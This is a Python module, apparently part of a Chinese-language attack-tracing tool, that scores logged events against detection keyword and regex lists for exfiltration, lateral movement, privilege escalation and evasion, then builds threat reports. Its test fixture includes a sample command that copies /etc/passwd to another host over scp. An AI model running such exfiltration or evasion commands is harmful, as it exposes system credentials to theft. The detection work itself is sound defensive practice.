#!/usr/bin/env python3
"""
跨设备攻击溯源系统 - 意图分析模块

该模块提供攻击意图分析、威胁评估和报告生成功能
"""

from datetime import datetime, timedelta
from typing import Dict, List, Any, Tuple, Set, Optional
from collections import defaultdict, Counter
import re
import json
from sz_config import system_config

class AttackIntentAnalyzer:
    """攻击意图分析器 - 分析攻击者的意图和目标"""
    
    def __init__(self):
        self.intent_patterns = {
            "data_exfiltration": {
                "keywords": ["scp", "rsync", "wget", "curl", "ftp", "sftp", "tar", "zip"],
                "file_patterns": [r"\.(txt|doc|pdf|xls|csv|sql|db)$", r"/home/", r"/Documents/"],
                "event_types": ["FILE_READ", "NETWORK_SEND"],
                "weight": 0.8
            },
            "lateral_movement": {
                "keywords": ["ssh", "rdp", "psexec", "wmic", "net use"],
                "patterns": [r"@\d+\.\d+\.\d+\.\d+", r"\\\\\d+\.\d+\.\d+\.\d+"],
                "event_types": ["NETWORK_CONNECTION", "PROCESS_LAUNCH"],
                "weight": 0.9
            },
            "privilege_escalation": {
                "keywords": ["sudo", "su", "runas", "elevate", "admin", "root"],
                "patterns": [r"sudo\s+", r"runas\s+"],
                "event_types": ["PROCESS_LAUNCH"],
                "weight": 0.7
            },
            "persistence": {
                "keywords": ["crontab", "service", "registry", "startup", "autorun"],
                "file_patterns": [r"/etc/cron", r"\\Windows\\System32", r"autostart"],
                "event_types": ["FILE_WRITE", "FILE_CREATE"],
                "weight": 0.6
            },
            "reconnaissance": {
                "keywords": ["nmap", "ping", "netstat", "ps", "whoami", "id", "ls", "dir"],
                "patterns": [r"ps\s+aux", r"netstat\s+-", r"nmap\s+"],
                "event_types": ["PROCESS_LAUNCH"],
                "weight": 0.5
            },
            "defense_evasion": {
                "keywords": ["base64", "encode", "obfuscate", "hide", "delete", "clear"],
                "patterns": [r"rm\s+-rf", r"del\s+/f", r"history\s+-c"],
                "event_types": ["FILE_DELETE", "PROCESS_LAUNCH"],
                "weight": 0.7
            }
        }
    
    def analyze_attack_intent(self, attack_paths: List[Dict[str, Any]]) -> Dict[str, Any]:
        """分析攻击意图"""
        print("[INFO] 开始分析攻击意图...")
        
        if not attack_paths:
            return {"intents": [], "primary_intent": "Unknown", "confidence": 0.0}
        
        intent_scores = defaultdict(float)
        intent_evidence = defaultdict(list)
        
        # 分析每条攻击路径
        for path in attack_paths:
            path_intents = self._analyze_path_intent(path)
            
            for intent, score in path_intents["scores"].items():
                intent_scores[intent] += score * path["score"]  # 加权
                intent_evidence[intent].extend(path_intents["evidence"][intent])
        
        # 归一化得分
        if intent_scores:
            max_score = max(intent_scores.values())
            if max_score > 0:
                for intent in intent_scores:
                    intent_scores[intent] /= max_score
        
        # 排序意图
        sorted_intents = sorted(intent_scores.items(), key=lambda x: x[1], reverse=True)
        
        # 构建结果
        result = {
            "intents": [],
            "primary_intent": "Unknown",
            "confidence": 0.0,
            "intent_timeline": self._build_intent_timeline(attack_paths),
            "attack_narrative": self._generate_attack_narrative(attack_paths, sorted_intents)
        }
        
        for intent, score in sorted_intents:
            if score > 0.1:  # 阈值过滤
                result["intents"].append({
                    "intent": intent,
                    "score": round(score, 3),
                    "confidence": self._calculate_intent_confidence(intent, intent_evidence[intent]),
                    "evidence": list(set(intent_evidence[intent]))  # 去重
                })
        
        if result["intents"]:
            result["primary_intent"] = result["intents"][0]["intent"]
            result["confidence"] = result["intents"][0]["confidence"]
        
        print(f"[INFO] 识别出主要攻击意图: {result['primary_intent']} (置信度: {result['confidence']:.2f})")
        
        return result
    
    def _analyze_path_intent(self, path: Dict[str, Any]) -> Dict[str, Any]:
        """分析单条路径的意图"""
        scores = defaultdict(float)
        evidence = defaultdict(list)
        
        # 分析时间线中的每个事件
        for event_info in path["timeline"]:
            event_id = event_info["event_id"]
            event_type = event_info["event_type"]
            description = event_info["description"]
            
            # 检查每种意图模式
            for intent, patterns in self.intent_patterns.items():
                intent_score = 0.0
                
                # 1. 关键词匹配
                for keyword in patterns["keywords"]:
                    if keyword.lower() in description.lower():
                        intent_score += 0.3
                        evidence[intent].append(f"关键词匹配: {keyword}")
                
                # 2. 正则模式匹配
                if "patterns" in patterns:
                    for pattern in patterns["patterns"]:
                        if re.search(pattern, description, re.IGNORECASE):
                            intent_score += 0.4
                            evidence[intent].append(f"模式匹配: {pattern}")
                
                # 3. 文件模式匹配
                if "file_patterns" in patterns:
                    for file_pattern in patterns["file_patterns"]:
                        if re.search(file_pattern, description, re.IGNORECASE):
                            intent_score += 0.3
                            evidence[intent].append(f"文件模式匹配: {file_pattern}")
                
                # 4. 事件类型匹配
                if event_type in patterns["event_types"]:
                    intent_score += 0.2
                    evidence[intent].append(f"事件类型匹配: {event_type}")
                
                # 应用权重
                scores[intent] += intent_score * patterns["weight"]
        
        return {"scores": dict(scores), "evidence": dict(evidence)}
    
    def _calculate_intent_confidence(self, intent: str, evidence_list: List[str]) -> float:
        """计算意图置信度"""
        if not evidence_list:
            return 0.0
        
        # 基于证据数量和多样性计算置信度
        evidence_count = len(evidence_list)
        evidence_types = set(ev.split(":")[0] for ev in evidence_list)
        
        # 证据数量得分
        count_score = min(1.0, evidence_count / 5)
        
        # 证据多样性得分
        diversity_score = min(1.0, len(evidence_types) / 3)
        
        # 综合置信度
        confidence = (count_score * 0.6 + diversity_score * 0.4)
        
        return round(confidence, 3)
    
    def _build_intent_timeline(self, attack_paths: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """构建意图时间线"""
        timeline_events = []
        
        for path in attack_paths:
            for event_info in path["timeline"]:
                # 分析该事件的主要意图
                event_intent = self._get_event_primary_intent(event_info["description"])
                
                timeline_events.append({
                    "timestamp": event_info["timestamp"],
                    "device": event_info["device"],
                    "event_type": event_info["event_type"],
                    "description": event_info["description"],
                    "primary_intent": event_intent,
                    "path_id": path["path_id"]
                })
        
        # 按时间排序
        timeline_events.sort(key=lambda x: x["timestamp"])
        
        return timeline_events
    
    def _get_event_primary_intent(self, description: str) -> str:
        """获取事件的主要意图"""
        intent_scores = {}
        
        for intent, patterns in self.intent_patterns.items():
            score = 0.0
            
            # 关键词匹配
            for keyword in patterns["keywords"]:
                if keyword.lower() in description.lower():
                    score += 1.0
            
            # 模式匹配
            if "patterns" in patterns:
                for pattern in patterns["patterns"]:
                    if re.search(pattern, description, re.IGNORECASE):
                        score += 1.5
            
            if score > 0:
                intent_scores[intent] = score * patterns["weight"]
        
        if intent_scores:
            return max(intent_scores.items(), key=lambda x: x[1])[0]
        else:
            return "unknown"
    
    def _generate_attack_narrative(self, attack_paths: List[Dict[str, Any]], 
                                 sorted_intents: List[Tuple[str, float]]) -> str:
        """生成攻击叙述"""
        if not attack_paths:
            return "未检测到明确的攻击活动。"
        
        narrative_parts = []
        
        # 攻击概述
        total_devices = set()
        for path in attack_paths:
            total_devices.update(path["devices"])
        
        narrative_parts.append(
            f"检测到针对 {len(total_devices)} 个设备的跨设备攻击活动，"
            f"共发现 {len(attack_paths)} 条攻击路径。"
        )
        
        # 主要意图
        if sorted_intents:
            primary_intent = sorted_intents[0][0]
            intent_desc = {
                "data_exfiltration": "数据窃取",
                "lateral_movement": "横向移动",
                "privilege_escalation": "权限提升",
                "persistence": "持久化驻留",
                "reconnaissance": "侦察探测",
                "defense_evasion": "防御规避"
            }
            
            narrative_parts.append(
                f"攻击者的主要意图为{intent_desc.get(primary_intent, primary_intent)}。"
            )
        
        # 攻击时间线
        all_timestamps = []
        for path in attack_paths:
            for event in path["timeline"]:
                all_timestamps.append(event["timestamp"])
        
        if all_timestamps:
            start_time = min(all_timestamps)
            end_time = max(all_timestamps)
            duration = (end_time - start_time).total_seconds()
            
            if duration < 3600:  # 小于1小时
                duration_desc = f"{duration/60:.0f}分钟"
            elif duration < 86400:  # 小于1天
                duration_desc = f"{duration/3600:.1f}小时"
            else:
                duration_desc = f"{duration/86400:.1f}天"
            
            narrative_parts.append(
                f"攻击活动持续时间约 {duration_desc}，"
                f"从 {start_time.strftime('%Y-%m-%d %H:%M:%S')} 开始。"
            )
        
        # 攻击技术
        all_techniques = set()
        for path in attack_paths:
            all_techniques.update(path["techniques"])
        
        if all_techniques:
            narrative_parts.append(
                f"攻击者使用了 {len(all_techniques)} 种不同的攻击技术，"
                f"包括 {', '.join(list(all_techniques)[:3])} 等。"
            )
        
        return " ".join(narrative_parts)

class ThreatAssessmentReporter:
    """威胁评估报告生成器"""
    
    def __init__(self):
        self.report_template = {
            "metadata": {},
            "executive_summary": {},
            "attack_analysis": {},
            "technical_details": {},
            "recommendations": {},
            "appendix": {}
        }
    
    def generate_threat_report(self, 
                             entry_points: List[Dict[str, Any]],
                             attack_paths: List[Dict[str, Any]],
                             intent_analysis: Dict[str, Any],
                             threat_score: Dict[str, Any]) -> Dict[str, Any]:
        """生成威胁评估报告"""
        print("[INFO] 生成威胁评估报告...")
        
        report = {
            "metadata": self._generate_metadata(),
            "executive_summary": self._generate_executive_summary(
                entry_points, attack_paths, intent_analysis, threat_score
            ),
            "attack_analysis": self._generate_attack_analysis(
                entry_points, attack_paths, intent_analysis
            ),
            "technical_details": self._generate_technical_details(
                entry_points, attack_paths
            ),
            "recommendations": self._generate_recommendations(
                intent_analysis, threat_score
            ),
            "appendix": self._generate_appendix(attack_paths)
        }
        
        return report
    
    def _generate_metadata(self) -> Dict[str, Any]:
        """生成报告元数据"""
        return {
            "report_id": f"THREAT_REPORT_{datetime.now().strftime('%Y%m%d_%H%M%S')}",
            "generated_at": datetime.now().isoformat(),
            "system_version": "跨设备攻击溯源系统 v1.0",
            "analysis_engine": "智能意图推理引擎"
        }
    
    def _generate_executive_summary(self, 
                                  entry_points: List[Dict[str, Any]],
                                  attack_paths: List[Dict[str, Any]],
                                  intent_analysis: Dict[str, Any],
                                  threat_score: Dict[str, Any]) -> Dict[str, Any]:
        """生成执行摘要"""
        # 统计受影响设备
        affected_devices = set()
        for path in attack_paths:
            affected_devices.update(path["devices"])
        
        # 统计攻击者IP
        attacker_ips = set()
        for ep in entry_points:
            attacker_ips.update(ep["attacker_ips"])
        
        return {
            "threat_level": threat_score.get("risk_level", "UNKNOWN"),
            "threat_score": threat_score.get("total_score", 0),
            "primary_intent": intent_analysis.get("primary_intent", "Unknown"),
            "affected_devices": len(affected_devices),
            "attack_paths_found": len(attack_paths),
            "entry_points_detected": len(entry_points),
            "attacker_ips": list(attacker_ips),
            "key_findings": self._generate_key_findings(
                entry_points, attack_paths, intent_analysis
            ),
            "immediate_actions": self._generate_immediate_actions(
                threat_score.get("risk_level", "LOW")
            )
        }
    
    def _generate_attack_analysis(self, 
                                entry_points: List[Dict[str, Any]],
                                attack_paths: List[Dict[str, Any]],
                                intent_analysis: Dict[str, Any]) -> Dict[str, Any]:
        """生成攻击分析"""
        return {
            "attack_timeline": intent_analysis.get("intent_timeline", []),
            "attack_narrative": intent_analysis.get("attack_narrative", ""),
            "attack_stages": self._analyze_attack_stages(attack_paths),
            "lateral_movement": self._analyze_lateral_movement(attack_paths),
            "persistence_mechanisms": self._analyze_persistence(attack_paths),
            "data_access_attempts": self._analyze_data_access(attack_paths)
        }
    
    def _generate_technical_details(self, 
                                  entry_points: List[Dict[str, Any]],
                                  attack_paths: List[Dict[str, Any]]) -> Dict[str, Any]:
        """生成技术细节"""
        return {
            "entry_point_analysis": entry_points,
            "attack_path_details": attack_paths,
            "ioc_summary": self._extract_iocs(entry_points, attack_paths),
            "network_indicators": self._extract_network_indicators(attack_paths),
            "file_indicators": self._extract_file_indicators(attack_paths),
            "process_indicators": self._extract_process_indicators(attack_paths)
        }
    
    def _generate_recommendations(self, 
                                intent_analysis: Dict[str, Any],
                                threat_score: Dict[str, Any]) -> Dict[str, Any]:
        """生成建议"""
        recommendations = {
            "immediate": [],
            "short_term": [],
            "long_term": []
        }
        
        risk_level = threat_score.get("risk_level", "LOW")
        primary_intent = intent_analysis.get("primary_intent", "unknown")
        
        # 基于风险等级的建议
        if risk_level in ["CRITICAL", "HIGH"]:
            recommendations["immediate"].extend([
                "立即隔离受影响的设备",
                "重置所有可能被泄露的凭据",
                "启动事件响应流程",
                "通知相关安全团队和管理层"
            ])
        
        # 基于攻击意图的建议
        intent_recommendations = {
            "data_exfiltration": [
                "检查数据丢失防护(DLP)系统",
                "审查文件访问日志",
                "加强数据分类和访问控制"
            ],
            "lateral_movement": [
                "实施网络分段",
                "加强特权访问管理",
                "部署端点检测和响应(EDR)解决方案"
            ],
            "persistence": [
                "检查系统启动项和计划任务",
                "更新防病毒和反恶意软件签名",
                "实施应用程序白名单"
            ]
        }
        
        if primary_intent in intent_recommendations:
            recommendations["short_term"].extend(
                intent_recommendations[primary_intent]
            )
        
        # 通用长期建议
        recommendations["long_term"].extend([
            "实施零信任网络架构",
            "加强安全意识培训",
            "定期进行渗透测试和安全评估",
            "建立完善的安全监控和日志分析能力"
        ])
        
        return recommendations
    
    def _generate_appendix(self, attack_paths: List[Dict[str, Any]]) -> Dict[str, Any]:
        """生成附录"""
        return {
            "mitre_attack_mapping": self._map_to_mitre_attack(attack_paths),
            "technical_references": self._generate_technical_references(),
            "glossary": self._generate_glossary()
        }
    
    def _generate_key_findings(self, 
                             entry_points: List[Dict[str, Any]],
                             attack_paths: List[Dict[str, Any]],
                             intent_analysis: Dict[str, Any]) -> List[str]:
        """生成关键发现"""
        findings = []
        
        # 攻击者IP发现
        all_attacker_ips = set()
        for ep in entry_points:
            all_attacker_ips.update(ep["attacker_ips"])
        
        if all_attacker_ips:
            findings.append(f"发现 {len(all_attacker_ips)} 个攻击者IP地址")
        
        # 跨设备传播
        cross_device_paths = [p for p in attack_paths if p["cross_device"]]
        if cross_device_paths:
            findings.append(f"检测到 {len(cross_device_paths)} 条跨设备攻击路径")
        
        # 高置信度入口点
        high_confidence_entries = [ep for ep in entry_points if ep["confidence"] > 0.7]
        if high_confidence_entries:
            findings.append(f"发现 {len(high_confidence_entries)} 个高置信度攻击入口点")
        
        # 攻击意图
        if intent_analysis.get("primary_intent") != "Unknown":
            findings.append(f"主要攻击意图: {intent_analysis['primary_intent']}")
        
        return findings
    
    def _generate_immediate_actions(self, risk_level: str) -> List[str]:
        """生成立即行动建议"""
        actions = {
            "CRITICAL": [
                "立即启动紧急响应程序",
                "隔离所有受影响系统",
                "通知高级管理层和法务部门",
                "联系外部安全专家"
            ],
            "HIGH": [
                "启动事件响应流程",
                "隔离受影响设备",
                "重置相关账户密码",
                "加强监控"
            ],
            "MEDIUM": [
                "增强监控和日志记录",
                "验证安全控制措施",
                "进行深度分析"
            ],
            "LOW": [
                "持续监控",
                "记录事件详情",
                "更新威胁情报"
            ]
        }
        
        return actions.get(risk_level, actions["LOW"])
    
    def _analyze_attack_stages(self, attack_paths: List[Dict[str, Any]]) -> Dict[str, Any]:
        """分析攻击阶段"""
        all_stages = []
        for path in attack_paths:
            all_stages.extend(path.get("attack_stages", []))
        
        stage_counts = Counter(all_stages)
        
        return {
            "stages_detected": list(stage_counts.keys()),
            "stage_frequency": dict(stage_counts),
            "kill_chain_coverage": len(stage_counts) / 7  # 基于Cyber Kill Chain的7个阶段
        }
    
    def _analyze_lateral_movement(self, attack_paths: List[Dict[str, Any]]) -> Dict[str, Any]:
        """分析横向移动"""
        lateral_paths = [p for p in attack_paths if p["cross_device"]]
        
        if not lateral_paths:
            return {"detected": False}
        
        # 分析移动模式
        movement_patterns = []
        for path in lateral_paths:
            devices = path["devices"]
            if len(devices) > 1:
                movement_patterns.append(" -> ".join(devices))
        
        return {
            "detected": True,
            "affected_devices": len(set().union(*[p["devices"] for p in lateral_paths])),
            "movement_patterns": movement_patterns,
            "techniques_used": list(set().union(*[p["techniques"] for p in lateral_paths]))
        }
    
    def _analyze_persistence(self, attack_paths: List[Dict[str, Any]]) -> Dict[str, Any]:
        """分析持久化机制"""
        persistence_indicators = []
        
        for path in attack_paths:
            if "Persistence" in path.get("attack_stages", []):
                persistence_indicators.append({
                    "path_id": path["path_id"],
                    "techniques": [t for t in path["techniques"] if "persistence" in t.lower()]
                })
        
        return {
            "detected": len(persistence_indicators) > 0,
            "mechanisms": persistence_indicators
        }
    
    def _analyze_data_access(self, attack_paths: List[Dict[str, Any]]) -> Dict[str, Any]:
        """分析数据访问尝试"""
        data_access_events = []
        
        for path in attack_paths:
            for event in path["timeline"]:
                if event["event_type"] in ["FILE_READ", "FILE_WRITE"] or "data" in event["description"].lower():
                    data_access_events.append(event)
        
        return {
            "detected": len(data_access_events) > 0,
            "access_attempts": len(data_access_events),
            "targeted_files": list(set(e["description"] for e in data_access_events))
        }
    
    def _extract_iocs(self, entry_points: List[Dict[str, Any]], 
                     attack_paths: List[Dict[str, Any]]) -> Dict[str, List[str]]:
        """提取威胁指标(IOCs)"""
        iocs = {
            "ip_addresses": [],
            "file_hashes": [],
            "file_paths": [],
            "command_lines": [],
            "network_connections": []
        }
        
        # 从入口点提取IP
        for ep in entry_points:
            iocs["ip_addresses"].extend(ep["attacker_ips"])
        
        # 从攻击路径提取其他IOCs
        for path in attack_paths:
            for event in path["timeline"]:
                description = event["description"]
                
                # 提取文件路径
                file_paths = re.findall(r'[/\\][\w\\/.]+', description)
                iocs["file_paths"].extend(file_paths)
                
                # 提取命令行
                if "command" in description.lower():
                    iocs["command_lines"].append(description)
        
        # 去重
        for key in iocs:
            iocs[key] = list(set(iocs[key]))
        
        return iocs
    
    def _extract_network_indicators(self, attack_paths: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """提取网络指标"""
        network_indicators = []
        
        for path in attack_paths:
            for event in path["timeline"]:
                if event["event_type"] in ["NETWORK_CONNECTION", "NETWORK_RECEIVE", "NETWORK_SEND"]:
                    # 处理时间戳格式
                    timestamp = event["timestamp"]
                    if hasattr(timestamp, 'isoformat'):
                        timestamp_str = timestamp.isoformat()
                    else:
                        timestamp_str = str(timestamp)
                    
                    network_indicators.append({
                        "timestamp": timestamp_str,
                        "device": event["device"],
                        "event_type": event["event_type"],
                        "description": event["description"]
                    })
        
        return network_indicators
    
    def _extract_file_indicators(self, attack_paths: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """提取文件指标"""
        file_indicators = []
        
        for path in attack_paths:
            for event in path["timeline"]:
                if event["event_type"] in ["FILE_WRITE", "FILE_READ", "FILE_CREATE", "FILE_DELETE"]:
                    # 处理时间戳格式
                    timestamp = event["timestamp"]
                    if hasattr(timestamp, 'isoformat'):
                        timestamp_str = timestamp.isoformat()
                    else:
                        timestamp_str = str(timestamp)
                    
                    file_indicators.append({
                        "timestamp": timestamp_str,
                        "device": event["device"],
                        "event_type": event["event_type"],
                        "description": event["description"]
                    })
        
        return file_indicators
    
    def _extract_process_indicators(self, attack_paths: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """提取进程指标"""
        process_indicators = []
        
        for path in attack_paths:
            for event in path["timeline"]:
                if event["event_type"] == "PROCESS_LAUNCH":
                    # 处理时间戳格式
                    timestamp = event["timestamp"]
                    if hasattr(timestamp, 'isoformat'):
                        timestamp_str = timestamp.isoformat()
                    else:
                        timestamp_str = str(timestamp)
                    
                    process_indicators.append({
                        "timestamp": timestamp_str,
                        "device": event["device"],
                        "description": event["description"]
                    })
        
        return process_indicators
    
    def _map_to_mitre_attack(self, attack_paths: List[Dict[str, Any]]) -> Dict[str, List[str]]:
        """映射到MITRE ATT&CK框架"""
        mitre_mapping = defaultdict(list)
        
        for path in attack_paths:
            for technique in path.get("techniques", []):
                if technique.startswith("T"):
                    tactic = self._get_mitre_tactic(technique)
                    mitre_mapping[tactic].append(technique)
        
        return dict(mitre_mapping)
    
    def _get_mitre_tactic(self, technique: str) -> str:
        """获取MITRE ATT&CK战术"""
        tactic_mapping = {
            "T1021": "Lateral Movement",
            "T1059": "Execution",
            "T1071": "Command and Control",
            "T1095": "Command and Control",
            "T1105": "Command and Control",
            "T1027": "Defense Evasion"
        }
        
        technique_id = technique.split(".")[0] if "." in technique else technique.split(" ")[0]
        return tactic_mapping.get(technique_id, "Unknown")
    
    def _generate_technical_references(self) -> List[Dict[str, str]]:
        """生成技术参考"""
        return [
            {
                "title": "MITRE ATT&CK Framework",
                "url": "https://attack.mitre.org/",
                "description": "全球知识库的对抗战术和技术"
            },
            {
                "title": "NIST Cybersecurity Framework",
                "url": "https://www.nist.gov/cyberframework",
                "description": "网络安全风险管理框架"
            }
        ]
    
    def _generate_glossary(self) -> Dict[str, str]:
        """生成术语表"""
        return {
            "IOC": "Indicator of Compromise - 威胁指标，表明系统可能已被入侵的证据",
            "TTPs": "Tactics, Techniques, and Procedures - 战术、技术和程序",
            "Lateral Movement": "横向移动，攻击者在网络中从一个系统移动到另一个系统",
            "Persistence": "持久化，攻击者在系统中保持访问权限的技术",
            "C2": "Command and Control - 命令与控制，攻击者与被入侵系统的通信渠道"
        }
    
    def save_report(self, report: Dict[str, Any], output_path: str):
        """保存报告到文件"""
        try:
            # 处理datetime对象
            def json_serializer(obj):
                if isinstance(obj, datetime):
                    return obj.isoformat()
                raise TypeError(f"Object of type {type(obj)} is not JSON serializable")
            
            with open(output_path, 'w', encoding='utf-8') as f:
                json.dump(report, f, ensure_ascii=False, indent=2, default=json_serializer)
            
            print(f"[INFO] 威胁评估报告已保存到: {output_path}")
            
        except Exception as e:
            print(f"[ERROR] 保存报告失败: {str(e)}")

# 测试函数
def test_intent_analysis():
    """测试意图分析功能"""
    print("=== 意图分析功能测试 ===")
    
    # 创建测试攻击路径
    test_paths = [
        {
            "path_id": "path_001",
            "devices": ["192.168.1.101", "192.168.1.106"],
            "timeline": [
                {
                    "timestamp": datetime.now(),
                    "device": "192.168.1.101",
                    "event_type": "NETWORK_CONNECTION",
                    "description": "ssh user@192.168.1.200"
                },
                {
                    "timestamp": datetime.now() + timedelta(seconds=30),
                    "device": "192.168.1.101",
                    "event_type": "PROCESS_LAUNCH",
                    "description": "scp /etc/passwd user@192.168.1.200:/tmp/"
                }
            ],
            "techniques": ["T1021.004 - SSH", "T1105 - Ingress Tool Transfer"],
            "attack_stages": ["Initial Access", "Collection"],
            "score": 0.8
        }
    ]
    
    # 测试意图分析
    analyzer = AttackIntentAnalyzer()
    intent_result = analyzer.analyze_attack_intent(test_paths)
    
    print(f"\n主要攻击意图: {intent_result['primary_intent']}")
    print(f"置信度: {intent_result['confidence']}")
    print(f"检测到的意图:")
    for intent in intent_result['intents']:
        print(f"  - {intent['intent']}: {intent['score']:.3f} (置信度: {intent['confidence']})")

if __name__ == "__main__":
    test_intent_analysis()
